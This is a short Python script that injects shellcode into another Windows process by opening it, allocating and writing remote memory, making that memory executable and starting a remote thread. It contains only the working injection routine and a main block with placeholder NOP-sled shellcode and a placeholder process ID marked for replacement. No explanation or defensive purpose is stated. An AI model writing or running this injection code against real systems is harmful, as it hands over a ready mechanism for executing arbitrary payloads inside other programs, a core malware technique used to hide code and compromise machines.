import ctypes

# Constants
PROCESS_VM_WRITE = 0x0020
PROCESS_VM_OPERATION = 0x0008
PROCESS_CREATE_THREAD = 0x0002
MEM_COMMIT = 0x1000
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READ = 0x20

def inject_shellcode(shellcode, process_id):
    kernel32 = ctypes.windll.kernel32

    # Open the process
    h_process = kernel32.OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD, False, process_id)
    if not h_process:
        print(f"Failed to open process {process_id}")
        return

    # Allocate memory in the target process
    shellcode_size = len(shellcode)
    addr = kernel32.VirtualAllocEx(h_process, None, shellcode_size, MEM_COMMIT, PAGE_READWRITE)
    if not addr:
        print("Failed to allocate memory in remote process")
        kernel32.CloseHandle(h_process)
        return

    # Write shellcode to the allocated memory
    written = ctypes.c_ulong(0)
    kernel32.WriteProcessMemory(h_process, addr, shellcode, shellcode_size, ctypes.byref(written))

    # Change memory protection to allow execution
    old_protect = ctypes.c_ulong(0)
    kernel32.VirtualProtectEx(h_process, addr, shellcode_size, PAGE_EXECUTE_READ, ctypes.byref(old_protect))

    # Create a remote thread to execute the shellcode
    thread_id = ctypes.c_ulong(0)
    h_thread = kernel32.CreateRemoteThread(h_process, None, 0, addr, None, 0, ctypes.byref(thread_id))
    if not h_thread:
        print("Failed to create remote thread")
        kernel32.CloseHandle(h_process)
        return

    # Clean up
    kernel32.CloseHandle(h_thread)
    kernel32.CloseHandle(h_process)

if __name__ == "__main__":
    # Example shellcode (replace with your actual shellcode)
    shellcode = b"\x90\x90\x90\x90"  # Example NOP sled

    # Example process ID (replace with your actual process ID)
    process_id = 1234  # Replace with the target process ID

    # Inject shellcode into the process
    inject_shellcode(shellcode, process_id)
